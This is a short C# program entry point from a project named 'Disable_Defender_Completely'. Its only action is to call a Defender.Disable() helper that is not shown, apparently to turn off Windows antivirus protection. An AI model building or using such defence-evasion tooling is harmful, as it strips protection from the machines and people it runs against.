using System;

namespace Disable_Defender_Completely
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Defender.Disable();
        }
    }
}
